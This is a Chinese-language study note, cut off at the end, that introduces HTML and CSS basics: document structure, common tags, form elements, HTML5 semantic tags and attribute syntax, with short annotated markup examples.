        <content type="html"><![CDATA[<h1 id="Html-CSS"><a href="#Html-CSS" class="headerlink" title="Html+CSS"></a>Html+CSS</h1><blockquote><p><a href=".\cc1b9611">text::JavaScript</a> </p><p>编辑器HbuildX（ctrl + /：注释）</p></blockquote><hr><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p><a href="https://www.w3school.com.cn/html/html5_intro.asp">Html教程</a></p><p><a href="https://www.runoob.com/html/html5-intro.html">Html教程</a></p><p><a href="http://moretrue.site/Home/Article/article/id/26.html">教师网站</a></p></blockquote><hr><h2 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h2><blockquote><p><a href="https://www.php.cn/html5-tutorial-410265.html">html5新增</a></p></blockquote><h4 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h4><ol><li><p>html 知识</p><blockquote><p>html只做格式，不做样式！</p><p>xhtml：W3C 制定的，因学习成本高，严格化很少人用。</p><p>html5：大公司联合制作，市场常用，后被 W3C 收纳。</p><p>html + xml = xhtml（html + css + js）（1.0已淘汰xhtml）</p><ol><li>strict：严格语法。</li><li>transitional：过渡型，可出错，市面上大部分标准都是这个。</li><li>frameset：框架型。</li></ol><p>浏览器模式：兼容（兼容以前的网页，慢），标准（更快）。</p><p>判断方式：头&lt;!DOCTYPE&gt;，不写默认兼容</p><p>浏览器显示不安全：使用的 http 协议而非 https 协议。（https要钱）</p></blockquote></li><li><p>XML知识</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML：可扩展标记语言（xml有严格语法要求，可自定义标签便于机器识别）--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">书</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">价格</span>&gt;</span>56<span class="tag">&lt;/<span class="name">价格</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">书</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>元素类型</p></li></ol><div class="table-container"><table><thead><tr><th>元素类型</th><th>特点</th></tr></thead><tbody><tr><td>块级元素</td><td>所占区域是整块，可设置宽高，自动换行（小间隙）</td></tr><tr><td>行内元素</td><td>所占区域按内容大小来，不可设置宽高，不自动换行</td></tr><tr><td>行内块状元素</td><td>可设置宽高，不自动换行</td></tr><tr><td>锚点</td><td>回到页面的某一处</td></tr></tbody></table></div><h4 id="2-基础语法"><a href="#2-基础语法" class="headerlink" title="2 基础语法"></a>2 基础语法</h4><blockquote><p>注意事项</p><ol><li>双标签必须闭合。</li><li>所有标签都是小写。</li><li>值必须用 “ value “，包裹。</li><li>控件错误将会被解析成文本框。（浏览器默认文本框最保险。）</li></ol></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--html5单标签可以无 / ，xhtml必须有--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签名</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签名</span> <span class="attr">属性名</span>=<span class="string">&quot;属性值&quot;</span> [<span class="attr">属性名</span>=<span class="string">&quot;属性值&quot;</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--双标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签名</span>&gt;</span><span class="tag">&lt;/<span class="name">标签名</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签名</span> <span class="attr">属性名</span>=<span class="string">&quot;属性值&quot;</span> [<span class="attr">属性名</span>=<span class="string">&quot;属性值&quot;</span>] &gt;</span><span class="tag">&lt;/<span class="name">标签名</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--整体结构--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网页体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--头部--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--身体（浏览器可见内容）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-基本样式"><a href="#3-基本样式" class="headerlink" title="3 基本样式"></a>3 基本样式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;引入的css文件的路径&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;引入的js文件的路径&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;!DOCTYPE html&gt;：声明版本html5</span></span><br><span class="line"><span class="comment">&lt;title&gt;&lt;/title&gt;：页面标题，收藏网页的默认名</span></span><br><span class="line"><span class="comment">&lt;meta&gt;：头属性设置</span></span><br><span class="line"><span class="comment">&lt;html lang=&quot;zh-CN&quot;&gt;：中文网页不要写 en，不然浏览器会提示你是否翻译网页成中文（即使写的中文）。</span></span><br><span class="line"><span class="comment">VScode中：! + Enter：快速生成html简单格式</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、标签"><a href="#二、标签" class="headerlink" title="二、标签"></a>二、标签</h2><h3 id="1-单标签"><a href="#1-单标签" class="headerlink" title="1 单标签"></a>1 单标签</h3><h4 id="1-1-水平线"><a href="#1-1-水平线" class="headerlink" title="1.1 水平线"></a>1.1 水平线</h4><p><code>&lt;hr /&gt;</code></p><blockquote><p>属性：width，size，align</p></blockquote><h4 id="1-2-换行"><a href="#1-2-换行" class="headerlink" title="1.2 换行"></a>1.2 换行</h4><p><code>&lt;br /&gt;</code></p><blockquote><p>行内元素</p></blockquote><h4 id="1-3-图片"><a href="#1-3-图片" class="headerlink" title="1.3 图片"></a>1.3 图片</h4><p><code>&lt;img /&gt;</code></p><blockquote><p>插入图片，行内元素</p><p>属性：src，title，alt，border，align，width，height（大小不建议大改，要大改直接改原图）</p></blockquote><h4 id="1-4-表单元素"><a href="#1-4-表单元素" class="headerlink" title="1.4 表单元素"></a>1.4 表单元素</h4><p><code>&lt;input /&gt;</code></p><blockquote><p>行内元素，不一定放入表单中，但提交必须放入表单中。</p><p>属性：type，value，readonly，maxlength，disabled</p><p>requried（一般不用，用 JS 实现）</p></blockquote><h3 id="2-双标签"><a href="#2-双标签" class="headerlink" title="2 双标签"></a>2 双标签</h3><h4 id="2-1-格式化标签"><a href="#2-1-格式化标签" class="headerlink" title="2.1 格式化标签"></a>2.1 格式化标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置字体相关属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：color，size，face--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--伪样式--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--与旁边区分,加粗，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--强调，行内元素（W3C加的）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--与旁边区分,斜体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--次级强调，斜体（W3C加的）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--下划线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--中划线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--长引用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--短引用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">q</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--缩写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abbr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--作者联系信息--&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--预格式化文本--&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--删除的文本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-普通文本"><a href="#2-2-普通文本" class="headerlink" title="2.2 普通文本"></a>2.2 普通文本</h4><h5 id="2-2-1-字体"><a href="#2-2-1-字体" class="headerlink" title="2.2.1 字体"></a>2.2.1 字体</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- n in [1,6] h1最大（会作为浏览器权重），hh6最小--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span><span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大小依次递减。</span></span><br><span class="line"><span class="comment">不建议在网页中写多个&lt;h1&gt;标签，&lt;h1&gt;标签可以被搜索引擎获取，如果有多个可能会进入搜索引擎黑名单。（其他随意）</span></span><br><span class="line"><span class="comment">快速生成多个的写法：h$&#123; title$ &#125;*6——tab--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--abbr，标记缩写词，配合 title 使用--&gt;</span></span><br><span class="line">The<span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;World Health Organization&quot;</span>&gt;</span>WHO<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> was founded in 1948.</span><br></pre></td></tr></table></figure><h5 id="2-2-2-段落"><a href="#2-2-2-段落" class="headerlink" title="2.2.2 段落"></a>2.2.2 段落</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--一段话，（所占区域是整块），自动换行（间隙比换行标签大）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--定义预格式化文本，保留设置时的空格和换行符，文本呈现等宽字体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-2-3-层"><a href="#2-2-3-层" class="headerlink" title="2.2.3 层"></a>2.2.3 层</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--层，块级元素（所占区域是整块，自动换行（小间隙）），用于布局--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--层，行内元素（所占区域按内容大小来，不自动换行）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-2-4-按钮"><a href="#2-2-4-按钮" class="headerlink" title="2.2.4 按钮"></a>2.2.4 按钮</h5><blockquote><p>相较表单元素可以插入内容在标签中</p><p>属性：disabled，type，value，name</p><p>tips：type默认是提交按钮</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-格式文本"><a href="#2-3-格式文本" class="headerlink" title="2.3 格式文本"></a>2.3 格式文本</h4><h5 id="2-3-1-列表"><a href="#2-3-1-列表" class="headerlink" title="2.3.1 列表"></a>2.3.1 列表</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：type（列表前的标识）（1.square（实心方块），2.circle（空心圆），3.disc（实心圆），4.decimal（小数）--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：type（列表前的标识）（分为1（默认），a，A，i，I）--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--自定义列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span> <span class="comment">&lt;!--标题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span> <span class="comment">&lt;!--内容--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-2-表格"><a href="#2-3-2-表格" class="headerlink" title="2.3.2 表格"></a>2.3.2 表格</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--表格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：align，border，width，height，style，colspan，rowspan--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通边框：style=&quot;border-collapse: collapse;&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：align，valign，bgcolor--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--表头单元格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--标准单元格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：rowspan，colspan--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-3-文本域"><a href="#2-3-3-文本域" class="headerlink" title="2.3.3 文本域"></a>2.3.3 文本域</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素，一块文本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：rows，cols--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-4-文本聚焦"><a href="#2-3-4-文本聚焦" class="headerlink" title="2.3.4 文本聚焦"></a>2.3.4 文本聚焦</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内元素，用于绑定多个元素。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;<span class="name">input</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：for--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-5-下拉框"><a href="#2-3-5-下拉框" class="headerlink" title="2.3.5 下拉框"></a>2.3.5 下拉框</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--下拉框，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：name，multiple，size，disabled--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--框中元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：selected，disabled，value--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--value：提交给服务器的选项值，没有该属性则提交标签中的值--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-3-6-包裹框"><a href="#2-3-6-包裹框" class="headerlink" title="2.3.6 包裹框"></a>2.3.6 包裹框</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--包裹框，将内容用一个框进行包裹--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--在包裹框线处显示文字--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>个人信息:<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">  姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-4-链接"><a href="#2-4-链接" class="headerlink" title="2.4 链接"></a>2.4 链接</h4><h5 id="2-4-1-超链接"><a href="#2-4-1-超链接" class="headerlink" title="2.4.1 超链接"></a>2.4.1 超链接</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置超链接，行内元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：href，target，name，title--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-4-2-表单"><a href="#2-4-2-表单" class="headerlink" title="2.4.2 表单"></a>2.4.2 表单</h5><blockquote><p>属性：</p><ul><li>novalidate：添加后取消表单的自动验证。</li></ul></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--向服务器传输数据，块级元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：action，method，name，target--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件时设置：enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-5-HTML5"><a href="#2-5-HTML5" class="headerlink" title="2.5 HTML5"></a>2.5 HTML5</h4><h5 id="2-5-1-input"><a href="#2-5-1-input" class="headerlink" title="2.5.1 input"></a>2.5.1 input</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--type：url，email，number，range，date，search（会影响手机输入法的顶部提示）--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-5-2-内联标签"><a href="#2-5-2-内联标签" class="headerlink" title="2.5.2 内联标签"></a>2.5.2 内联标签</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--网页里套网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--属性：src--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-5-3-格式标签"><a href="#2-5-3-格式标签" class="headerlink" title="2.5.3 格式标签"></a>2.5.3 格式标签</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--（Navigation）小型的页面内导航--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--页眉--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--页脚--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--侧边栏--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-属性"><a href="#3-属性" class="headerlink" title="3 属性"></a>3 属性</h3><h4 id="3-1-通用"><a href="#3-1-通用" class="headerlink" title="3.1 通用"></a>3.1 通用</h4><div class="table-container"><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>id</td><td>标识元素的唯一性，多用于前端判断。最好唯一，以字母、数字、下划线、中划线组成，不以数字开头</td></tr><tr><td>name</td><td>提交数据时的参数名，多用于后端判断。同一标签有同一name值为一组（例如性别设置）</td></tr><tr><td>style</td><td>设置元素的行内样式（具体的样式）</td></tr><tr><td>calss</td><td>设置元素的样式名</td></tr><tr><td>disabled</td><td>禁用</td></tr></tbody></table></div><h4 id="3-2-颜色"><a href="#3-2-颜色" class="headerlink" title="3.2 颜色"></a>3.2 颜色</h4><blockquote><p><a href="https://www.runoob.com/tags/att-td-bgcolor.html">bgcolor属性</a></p><p><a href="https://www.runoob.com/tags/att-body-text.html">text属性</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*背景*/</span></span><br><span class="line">bgcolor=&quot;value&quot;</span><br><span class="line"><span class="comment">/*文本*/</span></span><br><span class="line">text=&quot;value&quot; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* value有三种：颜色名：&quot;blue&quot;，rgb：&quot;rgb(255,0,0)&quot;，十六进制：&quot;#ff0000&quot; */</span></span><br></pre></td></tr></table></figure><h4 id="3-3-样式"><a href="#3-3-样式" class="headerlink" title="3.3 样式"></a>3.3 样式</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*宽度*/</span></span><br><span class="line"><span class="attribute">width</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/*高度*/</span></span><br><span class="line"><span class="attribute">height</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/*行长*/</span></span><br><span class="line">cols=&quot;value&quot;</span><br><span class="line"><span class="comment">/*列长*/</span></span><br><span class="line">rows=&quot;value&quot;</span><br><span class="line"><span class="comment">/*大小*/</span></span><br><span class="line">size=&quot;value&quot;</span><br><span class="line"><span class="comment">/*边框宽度*/</span></span><br><span class="line"><span class="attribute">border</span>=&quot;value&quot;</span><br><span class="line"><span class="comment">/* value：百分比(&quot;25%&quot;)，px(&quot;500px&quot;) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*上下对齐方式。value：&quot;top&quot;*/</span></span><br><span class="line">valign=&quot;value&quot;</span><br><span class="line"><span class="comment">/*左右对齐方式。value：&quot;left&quot;，&quot;right&quot;，&quot;center&quot;（默认），&quot;justify&quot;（两端对齐）*/</span></span><br><span class="line">align=&quot;value&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体样式。name：字体名字*/</span></span><br><span class="line">face=&quot;name&quot;</span><br><span class="line"><span class="comment">/*样式风格。name：格式名字*/</span></span><br><span class="line">style=&quot;name&quot;</span><br><span class="line">style=&quot;<span class="attribute">clear</span>:both;&quot;  <span class="comment">/* 清除浮动 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*鼠标悬停时文字。characters：内容*/</span></span><br><span class="line">title=&quot;characters&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*占用格子数（纵向，横向合并）。num：占用格子数*/</span></span><br><span class="line">rowspan / colspan=&quot;num&quot;</span><br></pre></td></tr></table></figure><h4 id="3-4-链接"><a href="#3-4-链接" class="headerlink" title="3.4 链接"></a>3.4 链接</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*路径。指向资源路径，可以是本地路径，可以是超链接。本地可以是：磁盘路径（写这个会从客户端的磁盘开始找），绝对路径（以&quot;/&quot;开头，例：&quot;/images/...&quot;），相对路径。*/</span></span><br><span class="line"><span class="attribute">src</span>=&quot;path&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*显示错误。characters：内容*/</span></span><br><span class="line">alt=&quot;characters&quot;</span><br></pre></td></tr></table></figure><h4 id="3-5-超链接"><a href="#3-5-超链接" class="headerlink" title="3.5 超链接"></a>3.5 超链接</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*链接*/</span></span><br><span class="line">href=&quot;url&quot;</span><br><span class="line"><span class="comment">/* href=&quot;&quot;或&quot;#&quot;时当做顶部锚点使用，&quot;#name&quot;可让该链接回到指定名字处，url 同 path。可以是邮件，如 mailto@163.com */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*打开方式*/</span></span><br><span 